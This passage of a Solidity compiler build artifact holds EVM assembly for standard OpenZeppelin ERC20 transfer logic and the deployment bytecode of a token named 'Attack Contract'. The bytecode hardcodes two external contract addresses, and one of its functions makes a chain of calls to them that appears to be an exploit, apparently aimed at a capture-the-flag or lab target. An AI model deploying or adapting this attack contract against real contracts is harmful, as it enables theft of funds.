*/\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7475:8126  function _transfer(... */\n    tag_84:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7601:7619  from != address(0) */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7593:7661  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_153\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":4654:4656   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7593:7661  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4636:4657   */\n      mstore\n        /* \"#utility.yul\":4693:4695   */\n      0x25\n        /* \"#utility.yul\":4673:4691   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4666:4696   */\n      mstore\n        /* \"#utility.yul\":4732:4766   */\n      0x45524332303a207472616e736665722066726f6d20746865207a65726f206164\n        /* \"#utility.yul\":4712:4730   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4705:4767   */\n      mstore\n        /* \"#utility.yul\":4803:4810   */\n      0x6472657373000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4783:4801   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4776:4811   */\n      mstore\n        /* \"#utility.yul\":4828:4847   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7593:7661  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_129\n        /* \"#utility.yul\":4452:4853   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7593:7661  require(from != address(0), \"ERC20: transfer from the zero address\") */\n    tag_153:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7679:7695  to != address(0) */\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7671:7735  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_156\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":3082:3084   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7671:7735  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3064:3085   */\n      mstore\n        /* \"#utility.yul\":3121:3123   */\n      0x23\n        /* \"#utility.yul\":3101:3119   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3094:3124   */\n      mstore\n        /* \"#utility.yul\":3160:3194   */\n      0x45524332303a207472616e7366657220746f20746865207a65726f2061646472\n        /* \"#utility.yul\":3140:3158   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3133:3195   */\n      mstore\n        /* \"#utility.yul\":3231:3236   */\n      0x6573730000000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3211:3229   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3204:3237   */\n      mstore\n        /* \"#utility.yul\":3254:3273   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7671:7735  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_129\n        /* \"#utility.yul\":2880:3279   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7671:7735  require(to != address(0), \"ERC20: transfer to the zero address\") */\n    tag_156:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7817:7832  _balances[from] */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7795:7814  uint256 fromBalance */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7817:7832  _balances[from] */\n      swap1\n      dup2\n      mstore\n      0x20\n      dup2\n      swap1\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7850:7871  fromBalance >= amount */\n      dup2\n      dup2\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7842:7914  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_161\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":4247:4249   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7842:7914  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4229:4250   */\n      mstore\n        /* \"#utility.yul\":4286:4288   */\n      0x26\n        /* \"#utility.yul\":4266:4284   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4259:4289   */\n      mstore\n        /* \"#utility.yul\":4325:4359   */\n      0x45524332303a207472616e7366657220616d6f756e7420657863656564732062\n        /* \"#utility.yul\":4305:4323   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4298:4360   */\n      mstore\n        /* \"#utility.yul\":4396:4404   */\n      0x616c616e63650000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4376:4394   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4369:4405   */\n      mstore\n        /* \"#utility.yul\":4422:4441   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7842:7914  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_129\n        /* \"#utility.yul\":4045:4447   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7842:7914  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n    tag_161:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7948:7963  _balances[from] */\n      dup1\n      dup6\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7948:7957  _balances */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7948:7963  _balances[from] */\n      swap1\n      dup2\n      mstore\n      0x20\n      dup2\n      swap1\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7966:7986  fromBalance - amount */\n      dup6\n      dup6\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7948:7986  _balances[from] = fromBalance - amount */\n      swap1\n      sstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8006:8019  _balances[to] */\n      swap2\n      dup6\n      and\n      dup2\n      mstore\n      swap1\n      dup2\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8006:8029  _balances[to] += amount */\n      dup1\n      sload\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7980:7986  amount */\n      dup5\n      swap3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7948:7957  _balances */\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8006:8029  _balances[to] += amount */\n      tag_164\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":7980:7986  amount */\n      dup5\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8006:8029  _balances[to] += amount */\n      tag_91\n      jump\t// in\n    tag_164:\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8060:8062  to */\n      dup3\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8045:8071  Transfer(from, to, amount) */\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8054:8058  from */\n      dup5\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8045:8071  Transfer(from, to, amount) */\n      and\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8064:8070  amount */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8045:8071  Transfer(from, to, amount) */\n      mload(0x40)\n      tag_165\n      swap2\n        /* \"#utility.yul\":6147:6172   */\n      dup2\n      mstore\n        /* \"#utility.yul\":6135:6137   */\n      0x20\n        /* \"#utility.yul\":6120:6138   */\n      add\n      swap1\n        /* \"#utility.yul\":6001:6178   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8045:8071  Transfer(from, to, amount) */\n    tag_165:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":8082:8119  _afterTokenTransfer(from, to, amount) */\n      tag_151\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11786:11907  function _beforeTokenTransfer(... */\n      jump\n        /* \"#utility.yul\":14:210   */\n    tag_171:\n        /* \"#utility.yul\":82:102   */\n      dup1\n      calldataload\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"#utility.yul\":131:185   */\n      dup2\n      and\n        /* \"#utility.yul\":121:186   */\n      dup2\n      eq\n        /* \"#utility.yul\":111:204   */\n      tag_173\n      jumpi\n        /* \"#utility.yul\":200:201   */\n      0x00\n        /* \"#utility.yul\":197:198   */\n      dup1\n        /* \"#utility.yul\":190:202   */\n      revert\n        /* \"#utility.yul\":111:204   */\n    tag_173:\n        /* \"#utility.yul\":14:210   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":215:401   */\n    tag_45:\n        /* \"#utility.yul\":274:280   */\n      0x00\n        /* \"#utility.yul\":327:329   */\n      0x20\n        /* \"#utility.yul\":315:324   */\n      dup3\n        /* \"#utility.yul\":306:313   */\n      dup5\n        /* \"#utility.yul\":302:325   */\n      sub\n        /* \"#utility.yul\":298:330   */\n      slt\n        /* \"#utility.yul\":295:347   */\n      iszero\n      tag_175\n      jumpi\n        /* \"#utility.yul\":343:344   */\n      0x00\n        /* \"#utility.yul\":340:341   */\n      dup1\n        /* \"#utility.yul\":333:345   */\n      revert\n        /* \"#utility.yul\":295:347   */\n    tag_175:\n        /* \"#utility.yul\":366:395   */\n      tag_176\n        /* \"#utility.yul\":385:394   */\n      dup3\n        /* \"#utility.yul\":366:395   */\n      tag_171\n      jump\t// in\n    tag_176:\n        /* \"#utility.yul\":356:395   */\n      swap4\n        /* \"#utility.yul\":215:401   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":406:666   */\n    tag_63:\n        /* \"#utility.yul\":474:480   */\n      0x00\n        /* \"#utility.yul\":482:488   */\n      dup1\n        /* \"#utility.yul\":535:537   */\n      0x40\n        /* \"#utility.yul\":523:532   */\n      dup4\n        /* \"#utility.yul\":514:521   */\n      dup6\n        /* \"#utility.yul\":510:533   */\n      sub\n        /* \"#utility.yul\":506:538   */\n      slt\n        /* \"#utility.yul\":503:555   */\n      iszero\n      tag_178\n      jumpi\n        /* \"#utility.yul\":551:552   */\n      0x00\n        /* \"#utility.yul\":548:549   */\n      dup1\n        /* \"#utility.yul\":541:553   */\n      revert\n        /* \"#utility.yul\":503:555   */\n    tag_178:\n        /* \"#utility.yul\":574:603   */\n      tag_179\n        /* \"#utility.yul\":593:602   */\n      dup4\n        /* \"#utility.yul\":574:603   */\n      tag_171\n      jump\t// in\n    tag_179:\n        /* \"#utility.yul\":564:603   */\n      swap2\n      pop\n        /* \"#utility.yul\":622:660   */\n      tag_180\n        /* \"#utility.yul\":656:658   */\n      0x20\n        /* \"#utility.yul\":645:654   */\n      dup5\n        /* \"#utility.yul\":641:659   */\n      add\n        /* \"#utility.yul\":622:660   */\n      tag_171\n      jump\t// in\n    tag_180:\n        /* \"#utility.yul\":612:660   */\n      swap1\n      pop\n        /* \"#utility.yul\":406:666   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":671:999   */\n    tag_32:\n        /* \"#utility.yul\":748:754   */\n      0x00\n        /* \"#utility.yul\":756:762   */\n      dup1\n        /* \"#utility.yul\":764:770   */\n      0x00\n        /* \"#utility.yul\":817:819   */\n      0x60\n        /* \"#utility.yul\":805:814   */\n      dup5\n        /* \"#utility.yul\":796:803   */\n      dup7\n        /* \"#utility.yul\":792:815   */\n      sub\n        /* \"#utility.yul\":788:820   */\n      slt\n        /* \"#utility.yul\":785:837   */\n      iszero\n      tag_182\n      jumpi\n        /* \"#utility.yul\":833:834   */\n      0x00\n        /* \"#utility.yul\":830:831   */\n      dup1\n        /* \"#utility.yul\":823:835   */\n      revert\n        /* \"#utility.yul\":785:837   */\n    tag_182:\n        /* \"#utility.yul\":856:885   */\n      tag_183\n        /* \"#utility.yul\":875:884   */\n      dup5\n        /* \"#utility.yul\":856:885   */\n      tag_171\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":846:885   */\n      swap3\n      pop\n        /* \"#utility.yul\":904:942   */\n      tag_184\n        /* \"#utility.yul\":938:940   */\n      0x20\n        /* \"#utility.yul\":927:936   */\n      dup6\n        /* \"#utility.yul\":923:941   */\n      add\n        /* \"#utility.yul\":904:942   */\n      tag_171\n      jump\t// in\n    tag_184:\n        /* \"#utility.yul\":894:942   */\n      swap2\n      pop\n        /* \"#utility.yul\":989:991   */\n      0x40\n        /* \"#utility.yul\":978:987   */\n      dup5\n        /* \"#utility.yul\":974:992   */\n      add\n        /* \"#utility.yul\":961:993   */\n      calldataload\n        /* \"#utility.yul\":951:993   */\n      swap1\n      pop\n        /* \"#utility.yul\":671:999   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":1004:1258   */\n    tag_22:\n        /* \"#utility.yul\":1072:1078   */\n      0x00\n        /* \"#utility.yul\":1080:1086   */\n      dup1\n        /* \"#utility.yul\":1133:1135   */\n      0x40\n        /* \"#utility.yul\":1121:1130   */\n      dup4\n        /* \"#utility.yul\":1112:1119   */\n      dup6\n        /* \"#utility.yul\":1108:1131   */\n      sub\n        /* \"#utility.yul\":1104:1136   */\n      slt\n        /* \"#utility.yul\":1101:1153   */\n      iszero\n      tag_186\n      jumpi\n        /* \"#utility.yul\":1149:1150   */\n      0x00\n        /* \"#utility.yul\":1146:1147   */\n      dup1\n        /* \"#utility.yul\":1139:1151   */\n      revert\n        /* \"#utility.yul\":1101:1153   */\n    tag_186:\n        /* \"#utility.yul\":1172:1201   */\n      tag_187\n        /* \"#utility.yul\":1191:1200   */\n      dup4\n        /* \"#utility.yul\":1172:1201   */\n      tag_171\n      jump\t// in\n    tag_187:\n        /* \"#utility.yul\":1162:1201   */\n      swap5\n        /* \"#utility.yul\":1248:1250   */\n      0x20\n        /* \"#utility.yul\":1233:1251   */\n      swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":1220:1252   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":1004:1258   */\n      jump\t// out\n        /* \"#utility.yul\":1263:1540   */\n    tag_124:\n        /* \"#utility.yul\":1330:1336   */\n      0x00\n        /* \"#utility.yul\":1383:1385   */\n      0x20\n        /* \"#utility.yul\":1371:1380   */\n      dup3\n        /* \"#utility.yul\":1362:1369   */\n      dup5\n        /* \"#utility.yul\":1358:1381   */\n      sub\n        /* \"#utility.yul\":1354:1386   */\n      slt\n        /* \"#utility.yul\":1351:1403   */\n      iszero\n      tag_189\n      jumpi\n        /* \"#utility.yul\":1399:1400   */\n      0x00\n        /* \"#utility.yul\":1396:1397   */\n      dup1\n        /* \"#utility.yul\":1389:1401   */\n      revert\n        /* \"#utility.yul\":1351:1403   */\n    tag_189:\n        /* \"#utility.yul\":1431:1440   */\n      dup2\n        /* \"#utility.yul\":1425:1441   */\n      mload\n        /* \"#utility.yul\":1484:1489   */\n      dup1\n        /* \"#utility.yul\":1477:1490   */\n      iszero\n        /* \"#utility.yul\":1470:1491   */\n      iszero\n        /* \"#utility.yul\":1463:1468   */\n      dup2\n        /* \"#utility.yul\":1460:1492   */\n      eq\n        /* \"#utility.yul\":1450:1510   */\n      tag_176\n      jumpi\n        /* \"#utility.yul\":1506:1507   */\n      0x00\n        /* \"#utility.yul\":1503:1504   */\n      dup1\n        /* \"#utility.yul\":1496:1508   */\n      revert\n        /* \"#utility.yul\":2278:2875   */\n    tag_19:\n        /* \"#utility.yul\":2390:2394   */\n      0x00\n        /* \"#utility.yul\":2419:2421   */\n      0x20\n        /* \"#utility.yul\":2448:2450   */\n      dup1\n        /* \"#utility.yul\":2437:2446   */\n      dup4\n        /* \"#utility.yul\":2430:2451   */\n      mstore\n        /* \"#utility.yul\":2480:2486   */\n      dup4\n        /* \"#utility.yul\":2474:2487   */\n      mload\n        /* \"#utility.yul\":2523:2529   */\n      dup1\n        /* \"#utility.yul\":2518:2520   */\n      dup3\n        /* \"#utility.yul\":2507:2516   */\n      dup6\n        /* \"#utility.yul\":2503:2521   */\n      add\n        /* \"#utility.yul\":2496:2530   */\n      mstore\n        /* \"#utility.yul\":2548:2549   */\n      0x00\n        /* \"#utility.yul\":2558:2698   */\n    tag_195:\n        /* \"#utility.yul\":2572:2578   */\n      dup2\n        /* \"#utility.yul\":2569:2570   */\n      dup2\n        /* \"#utility.yul\":2566:2579   */\n      lt\n        /* \"#utility.yul\":2558:2698   */\n      iszero\n      tag_197\n      jumpi\n        /* \"#utility.yul\":2667:2681   */\n      dup6\n      dup2\n      add\n        /* \"#utility.yul\":2663:2686   */\n      dup4\n      add\n        /* \"#utility.yul\":2657:2687   */\n      mload\n        /* \"#utility.yul\":2633:2650   */\n      dup6\n      dup3\n      add\n        /* \"#utility.yul\":2652:2654   */\n      0x40\n        /* \"#utility.yul\":2629:2655   */\n      add\n        /* \"#utility.yul\":2622:2688   */\n      mstore\n        /* \"#utility.yul\":2587:2597   */\n      dup3\n      add\n        /* \"#utility.yul\":2558:2698   */\n      jump(tag_195)\n    tag_197:\n        /* \"#utility.yul\":2716:2722   */\n      dup2\n        /* \"#utility.yul\":2713:2714   */\n      dup2\n        /* \"#utility.yul\":2710:2723   */\n      gt\n        /* \"#utility.yul\":2707:2798   */\n      iszero\n      tag_198\n      jumpi\n        /* \"#utility.yul\":2786:2787   */\n      0x00\n        /* \"#utility.yul\":2781:2783   */\n      0x40\n        /* \"#utility.yul\":2772:2778   */\n      dup4\n        /* \"#utility.yul\":2761:2770   */\n      dup8\n        /* \"#utility.yul\":2757:2779   */\n      add\n        /* \"#utility.yul\":2753:2784   */\n      add\n        /* \"#utility.yul\":2746:2788   */\n      mstore\n        /* \"#utility.yul\":2707:2798   */\n    tag_198:\n      pop\n        /* \"#utility.yul\":2859:2861   */\n      0x1f\n        /* \"#utility.yul\":2838:2853   */\n      add\n      not(0x1f)\n        /* \"#utility.yul\":2834:2863   */\n      and\n        /* \"#utility.yul\":2819:2864   */\n      swap3\n      swap1\n      swap3\n      add\n        /* \"#utility.yul\":2866:2868   */\n      0x40\n        /* \"#utility.yul\":2815:2869   */\n      add\n      swap4\n        /* \"#utility.yul\":2278:2875   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6372:6654   */\n    tag_91:\n        /* \"#utility.yul\":6412:6415   */\n      0x00\n        /* \"#utility.yul\":6443:6444   */\n      dup3\n        /* \"#utility.yul\":6439:6445   */\n      not\n        /* \"#utility.yul\":6436:6437   */\n      dup3\n        /* \"#utility.yul\":6433:6446   */\n      gt\n        /* \"#utility.yul\":6430:6623   */\n      iszero\n      tag_210\n      jumpi\n        /* \"#utility.yul\":6479:6556   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":6476:6477   */\n      0x00\n        /* \"#utility.yul\":6469:6557   */\n      mstore\n        /* \"#utility.yul\":6580:6584   */\n      0x11\n        /* \"#utility.yul\":6577:6578   */\n      0x04\n        /* \"#utility.yul\":6570:6585   */\n      mstore\n        /* \"#utility.yul\":6608:6612   */\n      0x24\n        /* \"#utility.yul\":6605:6606   */\n      0x00\n        /* \"#utility.yul\":6598:6613   */\n      revert\n        /* \"#utility.yul\":6430:6623   */\n    tag_210:\n      pop\n        /* \"#utility.yul\":6639:6648   */\n      add\n      swap1\n        /* \"#utility.yul\":6372:6654   */\n      jump\t// out\n        /* \"#utility.yul\":6659:7096   */\n    tag_68:\n        /* \"#utility.yul\":6744:6745   */\n      0x02\n        /* \"#utility.yul\":6734:6746   */\n      dup2\n      div\n        /* \"#utility.yul\":6791:6792   */\n      0x01\n        /* \"#utility.yul\":6781:6793   */\n      dup3\n      and\n      dup1\n        /* \"#utility.yul\":6802:6863   */\n      tag_212\n      jumpi\n        /* \"#utility.yul\":6856:6860   */\n      0x7f\n        /* \"#utility.yul\":6848:6854   */\n      dup3\n        /* \"#utility.yul\":6844:6861   */\n      and\n        /* \"#utility.yul\":6834:6861   */\n      swap2\n      pop\n        /* \"#utility.yul\":6802:6863   */\n    tag_212:\n        /* \"#utility.yul\":6909:6911   */\n      0x20\n        /* \"#utility.yul\":6901:6907   */\n      dup3\n        /* \"#utility.yul\":6898:6912   */\n      lt\n        /* \"#utility.yul\":6878:6896   */\n      dup2\n        /* \"#utility.yul\":6875:6913   */\n      eq\n        /* \"#utility.yul\":6872:7090   */\n      iszero\n      tag_213\n      jumpi\n        /* \"#utility.yul\":6946:7023   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":6943:6944   */\n      0x00\n        /* \"#utility.yul\":6936:7024   */\n      mstore\n        /* \"#utility.yul\":7047:7051   */\n      0x22\n        /* \"#utility.yul\":7044:7045   */\n      0x04\n        /* \"#utility.yul\":7037:7052   */\n      mstore\n        /* \"#utility.yul\":7075:7079   */\n      0x24\n        /* \"#utility.yul\":7072:7073   */\n      0x00\n        /* \"#utility.yul\":7065:7080   */\n      revert\n        /* \"#utility.yul\":6872:7090   */\n    tag_213:\n      pop\n        /* \"#utility.yul\":6659:7096   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122007884b747e73521d137cbfdbe4c823b04341c3aafbce4161e4c75b48c559a7dc64736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260058054600160a060020a031990811673094251c982cb00b1b1e1707d61553e304289d4d8179091556006805490911673550714e1fd747084fc5cb2b2e3a93512972aebda1790553480156200005957600080fd5b50604080518082018252600f81527f41747461636b20436f6e7472616374000000000000000000000000000000000060208083019182528351808501909452600284527f4143000000000000000000000000000000000000000000000000000000000000908401528151919291620000d49160039162000252565b508051620000ea90600490602084019062000252565b50505062000117306e13426172c74d822b878fe8000000006200011d640100000000026401000000009004565b6200038e565b600160a060020a03821662000192576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015260640160405180910390fd5b620001a9600083836401000000006200024d810204565b8060026000828254620001bd9190620002f8565b9091555050600160a060020a03821660009081526020819052604081208054839290620001ec908490620002f8565b9091555050604051818152600160a060020a038316906000907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9060200160405180910390a362000249600083836401000000006200024d810204565b5050565b505050565b828054620002609062000338565b90600052602060002090601f016020900481019282620002845760008555620002cf565b82601f106200029f57805160ff1916838001178555620002cf565b82800160010185558215620002cf579182015b82811115620002cf578251825591602001919060010190620002b2565b50620002dd929150620002e1565b5090565b5b80821115620002dd5760008155600101620002e2565b6000821982111562000333577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b500190565b6002810460018216806200034d57607f821691505b6020821081141562000388577f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b50919050565b610c8f806200039e6000396000f3fe608060405234801561001057600080fd5b50600436106100d1576000357c01000000000000000000000000000000000000000000000000000000009004806370a082311161008e57806370a082311461015e57806395d89b41146101875780639e5faafc1461018f578063a457c2d714610199578063a9059cbb146101ac578063dd62ed3e146101bf57600080fd5b806306fdde03146100d6578063095ea7b3146100f457806318160ddd1461011757806323b872dd14610129578063313ce5671461013c578063395093511461014b575b600080fd5b6100de6101d2565b6040516100eb9190610b71565b60405180910390f35b610107610102366004610b25565b610264565b60405190151581526020016100eb565b6002545b6040519081526020016100eb565b610107610137366004610ae9565b61027c565b604051601281526020016100eb565b610107610159366004610b25565b6102a0565b61011b61016c366004610a94565b600160a060020a031660009081526020819052604090205490565b6100de6102c2565b6101976102d1565b005b6101076101a7366004610b25565b6105a9565b6101076101ba366004610b25565b610644565b61011b6101cd366004610ab6565b610652565b6060600380546101e190610c05565b80601f016020809104026020016040519081016040528092919081815260200182805461020d90610c05565b801561025a5780601f1061022f5761010080835404028352916020019161025a565b820191906000526020600020905b81548152906001019060200180831161023d57829003601f168201915b5050505050905090565b60003361027281858561067d565b5060019392505050565b60003361028a8582856107db565b610295858585610858565b506001949350505050565b6000336102728185856102b38383610652565b6102bd9190610bc6565b61067d565b6060600480546101e190610c05565b6005546040517fc994bc86000000000000000000000000000000000000000000000000000000008152600160a060020a039091169063c994bc869061034a9060040160208082526004908201527f62616e6b00000000000000000000000000000000000000000000000000000000604082015260600190565b600060405180830381600087803b15801561036457600080fd5b505af1158015610378573d6000803e3d6000fd5b50506006546040517f077bf51a000000000000000000000000000000000000000000000000000000008152306004820152600160a060020a03909116925063077bf51a9150602401600060405180830381600087803b1580156103da57600080fd5b505af11580156103ee573d6000803e3d6000fd5b50506006546040517f8cba4686000000000000000000000000000000000000000000000000000000008152306004820152600160a060020a039091169250638cba46869150602401600060405180830381600087803b15801561045057600080fd5b505af1158015610464573d6000803e3d6000fd5b50506006546104859250309150600160a060020a031664e8d4a5100061067d565b600660009054906101000a9004600160a060020a0316600160a060020a031663f99a1f306040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156104f157600080fd5b505af1158015610505573d6000803e3d6000fd5b50506005546040517fa9059cbb00000000000000000000000000000000000000000000000000000000815233600482015260016024820152600160a060020a03909116925063a9059cbb9150604401602060405180830381600087803b15801561056e57600080fd5b505af1158015610582573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105a69190610b4f565b50565b600033816105b78286610652565b9050838110156106375760405160e560020a62461bcd02815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760448201527f207a65726f00000000000000000000000000000000000000000000000000000060648201526084015b60405180910390fd5b610295828686840361067d565b600033610272818585610858565b600160a060020a03918216600090815260016020908152604080832093909416825291909152205490565b600160a060020a0383166106fb5760405160e560020a62461bcd028152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460448201527f7265737300000000000000000000000000000000000000000000000000000000606482015260840161062e565b600160a060020a03821661077a5760405160e560020a62461bcd02815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f20616464726560448201527f7373000000000000000000000000000000000000000000000000000000000000606482015260840161062e565b600160a060020a0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b60006107e78484610652565b9050600019811461085257818110156108455760405160e560020a62461bcd02815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161062e565b610852848484840361067d565b50505050565b600160a060020a0383166108d75760405160e560020a62461bcd02815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f20616460448201527f6472657373000000000000000000000000000000000000000000000000000000606482015260840161062e565b600160a060020a0382166109565760405160e560020a62461bcd02815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201527f6573730000000000000000000000000000000000000000000000000000000000606482015260840161062e565b600160a060020a038316600090815260208190526040902054818110156109e85760405160e560020a62461bcd02815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e742065786365656473206260448201527f616c616e63650000000000000000000000000000000000000000000000000000606482015260840161062e565b600160a060020a03808516600090815260208190526040808220858503905591851681529081208054849290610a1f908490610bc6565b9250508190555082600160a060020a031684600160a060020a03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610a6b91815260200190565b60405180910390a3610852565b8035600160a060020a0381168114610a8f57600080fd5b919050565b600060208284031215610aa657600080fd5b610aaf82610a78565b9392505050565b60008060408385031215610ac957600080fd5b610ad283610a78565b9150610ae060208401610a78565b90509250929050565b600080600060608486031215610afe57600080fd5b610b0784610a78565b9250610b1560208501610a78565b9150604084013590509250925092565b60008060408385031215610b3857600080fd5b610b4183610a78565b946020939093013593505050565b600060208284031215610b6157600080fd5b81518015158114610aaf57600080fd5b600060208083528351808285015260005b81811015610b9e57858101830151858201604001528201610b82565b81811115610bb0576000604083870101525b50601f01601f1916929092016040019392505050565b60008219821115610c00577f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b500190565b600281046001821680610c1957607f821691505b60208210811415610c53577f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b5091905056fea264697066735822122007884b747e73521d137cbfdbe4c823b04341c3aafbce4161e4c75b48c559a7dc64736f6c63430008070033",
